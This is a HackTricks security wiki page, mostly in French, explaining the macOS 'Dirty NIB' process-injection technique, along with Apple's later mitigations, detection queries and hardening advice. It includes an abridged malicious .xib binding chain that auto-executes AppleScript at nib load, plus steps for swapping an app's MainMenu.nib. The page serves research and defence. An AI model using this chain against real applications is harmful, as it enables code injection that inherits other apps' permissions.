# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB refers to abusing Interface Builder files (.xib/.nib) inside a signed macOS app bundle to execute attacker-controlled logic inside the target process, thereby inheriting its entitlements and TCC permissions. This technique was originally documented by xpn (MDSec) and later generalized and significantly expanded by Sector7, who also covered Apple’s mitigations in macOS 13 Ventura and macOS 14 Sonoma. For background and deep dives, see the references at the end.

> TL;DR
> • Before macOS 13 Ventura: replacing a bundle’s MainMenu.nib (or another nib loaded at startup) could reliably achieve process injection and often privilege escalation.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, and the new TCC “App Management” permission largely prevent post‑launch nib tampering by unrelated apps. Attacks may still be feasible in niche cases (e.g., same‑developer tooling modifying own apps, or terminals granted App Management/Full Disk Access by the user).


## Que sont les fichiers NIB/XIB

Les fichiers Nib (abréviation de NeXT Interface Builder) sont des graphes d'objets d'interface utilisateur sérialisés utilisés par les apps AppKit. Les versions récentes de Xcode stockent des .xib XML éditables qui sont compilés en .nib lors de la compilation. Une app typique charge son interface principale via `NSApplicationMain()` qui lit la clé `NSMainNibFile` dans l’Info.plist de l’app et instancie le graphe d'objets à l'exécution.

Points clés qui permettent l'attaque :
- Le chargement d'un NIB instancie des classes Objective‑C arbitraires sans exiger qu'elles implémentent NSSecureCoding (le chargeur de nib d'Apple retombe sur `init`/`initWithFrame:` lorsque `initWithCoder:` n'est pas disponible).
- Les Cocoa Bindings peuvent être abusées pour appeler des méthodes lors de l'instanciation des nibs, y compris des appels chaînés ne nécessitant aucune interaction de l'utilisateur.


## Processus d'injection Dirty NIB (point de vue de l'attaquant)

Le flux classique avant Ventura :
1) Créer un .xib malveillant
- Ajouter un objet `NSAppleScript` (ou d'autres classes "gadget" comme `NSTask`).
- Ajouter un `NSTextField` dont le title contient le payload (par ex., AppleScript ou des arguments de commande).
- Ajouter un ou plusieurs objets `NSMenuItem` câblés via bindings pour appeler des méthodes sur l'objet cible.

2) Déclenchement automatique sans clics de l'utilisateur
- Utiliser les bindings pour définir le target/selector d'un menu et ensuite invoquer la méthode privée `_corePerformAction` afin que l'action se déclenche automatiquement lors du chargement du nib. Cela supprime le besoin pour un utilisateur de cliquer sur un bouton.

Exemple minimal d'une chaîne de déclenchement automatique à l'intérieur d'un .xib (abrégée pour plus de clarté):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Ceci permet l'exécution arbitraire d'AppleScript dans le processus cible lors du chargement du nib. Des chaînes avancées peuvent :
- Instancier des classes AppKit arbitraires (par ex., `NSTask`) et appeler des méthodes sans argument comme `-launch`.
- Appeler des selectors arbitraires avec des arguments objet via l'astuce de binding ci‑dessus.
- Charger AppleScriptObjC.framework pour effectuer un pont vers Objective‑C et même appeler certaines APIs C sélectionnées.
- Sur les systèmes plus anciens qui incluent encore Python.framework, effectuer un pont vers Python puis utiliser `ctypes` pour appeler des fonctions C arbitraires (recherche de Sector7).

3) Remplacer le nib de l’application
- Copier target.app dans un emplacement accessible en écriture, remplacer, par ex., `Contents/Resources/MainMenu.nib` par le nib malveillant, et lancer target.app. Avant Ventura, après une évaluation Gatekeeper unique, les lancements suivants n'effectuaient que des vérifications de signature superficielles, donc les ressources non exécutables (comme .nib) n'étaient pas revérifiées.

Exemple de payload AppleScript pour un test visible :
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Protections modernes de macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple a introduit plusieurs mitigations systémiques qui réduisent drastiquement la viabilité de Dirty NIB sur les versions récentes de macOS:
- Vérification approfondie au premier lancement et protection du bundle (macOS 13 Ventura)
- Au premier lancement de n’importe quelle app (quarantinée ou non), une vérification de signature approfondie couvre toutes les ressources du bundle. Ensuite, le bundle devient protégé : seules les apps du même développeur (ou explicitement autorisées par l’app) peuvent modifier son contenu. Les autres apps requièrent la nouvelle permission TCC “App Management” pour écrire dans le bundle d’une autre app.
- Launch Constraints (macOS 13 Ventura)
- Les apps fournies par Apple ou le système ne peuvent pas être copiées ailleurs puis lancées ; cela rend impossible l’approche “copy to /tmp, patch, run” pour les apps système.
- Améliorations dans macOS 14 Sonoma
- Apple a durci App Management et corrigé des contournements connus (p. ex. CVE‑2023‑40450) signalés par Sector7. Python.framework a été retiré plus tôt (macOS 12.3), rompant certaines chaînes d’escalade de privilèges.
- Modifications de Gatekeeper/Quarantine
- Pour une discussion plus complète des changements de Gatekeeper, de la provenance et de l’évaluation qui ont impacté cette technique, voir la page référencée ci‑dessous.

> Implication pratique
> • Sur Ventura+ vous ne pouvez généralement pas modifier le .nib d’une app tierce à moins que votre processus n’ait App Management ou ne soit signé par le même Team ID que la cible (p.ex., outils de développement).
> • Accorder App Management ou Full Disk Access à des shells/terminaux rouvre effectivement cette surface d’attaque pour tout ce qui peut exécuter du code dans le contexte de ce terminal.

### Gérer les Launch Constraints

Les Launch Constraints empêchent l’exécution de nombreuses apps Apple depuis des emplacements non par défaut à partir de Ventura. Si vous dépendiez de workflows pré‑Ventura comme copier une app Apple dans un répertoire temporaire, modifier `MainMenu.nib`, puis la lancer, attendez‑vous à ce que cela échoue sur >= 13.0.


## Énumération des cibles et des nibs (utile pour la recherche / systèmes hérités)

- Localiser les apps dont l’UI est basée sur des .nib :
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Trouver des ressources nib candidates à l'intérieur d'un bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valider en profondeur les code signatures (échouera si vous avez modifié les ressources et n'avez pas re-signé) :
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Remarque : Sur les versions modernes de macOS vous serez également bloqué par bundle protection/TCC lorsque vous tenterez d'écrire dans le bundle d'une autre app sans autorisation appropriée.


## Détection et conseils DFIR

- Surveillance de l'intégrité des fichiers sur les ressources de bundle
- Surveillez les changements de mtime/ctime de `Contents/Resources/*.nib` et d'autres ressources non‑exécutables dans les apps installées.
- Journaux unifiés et comportement des processus
- Surveillez l'exécution AppleScript inattendue à l'intérieur des apps GUI et les processus chargeant AppleScriptObjC ou Python.framework. Exemple :
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Analyses proactives
- Exécutez périodiquement `codesign --verify --deep` sur les apps critiques pour vous assurer que les ressources restent intactes.
- Contexte de privilèges
- Auditez qui/quoi a TCC “App Management” ou Full Disk Access (en particulier les terminaux et agents de gestion). Retirer ces droits des shells à usage général empêche de réactiver trivialement les altérations de type Dirty NIB.


## Renforcement défensif (développeurs et défenseurs)

- Privilégiez une UI programmatique ou limitez ce qui est instancié depuis des nibs. Évitez d'inclure des classes puissantes (par ex., `NSTask`) dans les graphes de nib et évitez les bindings qui invoquent indirectement des selectors sur des objets arbitraires.
- Adoptez le hardened runtime avec Library Validation (déjà standard pour les apps modernes). Bien que cela n'empêche pas à lui seul l'injection via nib, cela bloque le chargement facile de code natif et force les attaquants à des payloads uniquement scripting.
- Ne demandez pas et ne dépendez pas de permissions larges App Management dans les outils à usage général. Si MDM nécessite App Management, isolez ce contexte des shells pilotés par l'utilisateur.
- Vérifiez régulièrement l'intégrité du bundle de votre app et faites en sorte que vos mécanismes de mise à jour autoréparent les ressources du bundle.


## Related reading in HackTricks

Learn more about Gatekeeper, quarantine and provenance changes that affect this technique:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (article original avec exemple Pages) : https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024) : https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
